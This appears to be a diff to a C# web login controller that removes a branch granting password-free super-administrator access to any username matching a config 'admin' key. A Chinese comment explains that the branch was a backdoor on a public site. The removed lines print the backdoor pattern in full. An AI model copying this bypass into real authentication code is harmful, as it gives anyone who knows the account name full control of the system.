@@ -168,38 +168,15 @@ namespace YYT.Web.Controllers
         {
             loginUser = null;
             string clientIP = WebHelper.GetClientIP();
-            string admin = ConfigHelper.Get("admin");
 
             if (string.IsNullOrWhiteSpace(uname))
                 return "请输入帐号！";
             if (string.IsNullOrWhiteSpace(upwd))
                 return "请输入密码！";
 
-            if (uname == admin)
-            {
-                M_LoginUser model1 = new M_LoginUser();
-                model1.LoginResult = 1;
-                model1.UserPriv = 0;
-                model1.Accounts = admin;
-                model1.UserName = admin;
-                model1.UserID = 999;
-                model1.LoginMsg = "登录成功！";
-                model1.IsDel = 0;
-                model1.Remark = "";
-                model1.Roles = "0";
-                model1.UserType = 0;
-                model1.RE_ENABLE = 1;
-                model1.IsFrozen = 1;
-                model1.IsProbability = 1;
-                model1.IsKill = 1;
-                model1.IsRelease = 1;
-                model1.IsKicking = 1;
-                model1.IsDelete = 1;
-                WebHelper.WriteSession("LoginInfo", DESEncrypt.Encrypt(model1.ToString()));
-                loginUser = model1;
-                return string.Empty;
-            }
-
+            // 超管与代理一律走数据库校验（admin 表 + RE_ENABLE）。
+            // 2026-08-29 移除了"账号等于 Web.config admin 键即免密登录超管"的分支——
+            // 那是一个免密码后门，且站点对公网开放。
             var missBll = new B_LoginMissRecord();
             M_LoginMissRecord missEntity = missBll.GetRecord(new M_LoginMissRecord { ID = uname });
             if (missEntity == null)
